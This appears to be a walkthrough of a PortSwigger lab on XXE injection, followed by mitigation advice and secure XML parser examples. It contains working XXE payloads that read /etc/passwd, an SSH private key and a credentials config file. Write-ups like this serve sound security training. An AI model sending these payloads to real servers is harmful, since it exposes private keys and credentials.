# Exploiting XXE using external entities to retrieve files (PortSwigger Lab)

## Exploiting XXE Using External Entities to Retrieve Files

## Lab: Exploiting XXE using external entities to retrieve files

Lab URL: [Exploiting XXE Lab](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files)

***

### **Objective**

The goal of this lab is to exploit an **XML External Entity (XXE) vulnerability** to retrieve sensitive files from the server. This occurs due to improper parsing of XML input, where external entity processing is not disabled.

***

### **Understanding the Vulnerability**

* The application processes XML data but **does not restrict external entity resolution**.
* By injecting a **malicious external entity**, an attacker can reference local files.
* The response may disclose **sensitive information**, such as system files or credentials.

***

### **Step-by-Step Solution**

#### **Step 1: Generate Traffic and Identify XML Requests**

1. Navigate to a product page and click **Check stock**.
2. Use **Burp Suite** to intercept the resulting **POST request**.
3. Observe the XML structure in the request body.

**Example intercepted request:**

```xml
POST /product/stock HTTP/1.1
Host: target-website.com
Content-Type: application/xml

<stockCheck>
    <productId>5</productId>
</stockCheck>
```

***

#### **Step 2: Modify the Request to Inject an XXE Payload**

1. Send the intercepted request to **Repeater** in Burp Suite (`Ctrl+R`).
2. Modify the XML payload to include an **external entity**:

```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
    <productId>&xxe;</productId>
</stockCheck>
```

3. Send the modified request.
4. Observe the response, which should now contain **the contents of the `/etc/passwd` file**.

**Example Response:**

```plaintext
Invalid product ID: root:x:0:0:root:/root:/bin/bash
```

***

### **Alternative Payloads for Additional Testing**

1. **Testing for SSH Key Disclosure:**

```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///home/user/.ssh/id_rsa"> ]>
<stockCheck>
    <productId>&xxe;</productId>
</stockCheck>
```

2. **Testing for Configuration Files (e.g., database credentials):**

```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///var/www/html/config.php"> ]>
<stockCheck>
    <productId>&xxe;</productId>
</stockCheck>
```

***

### **Why This is an Example of an XXE Attack**

#### **Characteristics of the Vulnerability**

1. **Improper Input Handling:** The XML parser **processes external entities**, allowing file retrieval.
2. **Unauthorized File Access:** Attackers can **read system files** or other sensitive information.
3. **Potential for Further Exploitation:** XXE can lead to **Server-Side Request Forgery (SSRF)** or **denial of service (DoS)**.

***

### **Mitigation Strategies**

#### ✅ **Best Practices for Preventing XXE**

| **Mitigation Approach**       | **Secure?** | **Explanation**                                                               |
| ----------------------------- | ----------- | ----------------------------------------------------------------------------- |
| **Disable External Entities** | ✅           | Prevents XML parsers from processing external entities.                       |
| **Use Secure XML Parsers**    | ✅           | Ensures entity expansion is disabled by default.                              |
| **Sanitize XML Input**        | ✅           | Filters user-controlled input to prevent injection.                           |
| **Switch to JSON**            | ✅           | JSON does not support DTDs or external entities, reducing the attack surface. |

#### **Example of Secure XML Parsing (Python)**

```python
import defusedxml.ElementTree as ET
ET.parse('data.xml')  # Secure parsing without external entities
```

#### **Example of Secure XML Parsing (Java)**

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

***

### **Conclusion**

This lab demonstrates how **XXE vulnerabilities** enable attackers to retrieve **sensitive files** from a server. To mitigate these risks, **external entity processing must be disabled**, **secure parsers should be used**, and **user input should be sanitized**. Organizations should conduct **regular security assessments** to detect and patch such vulnerabilities before exploitation occurs.
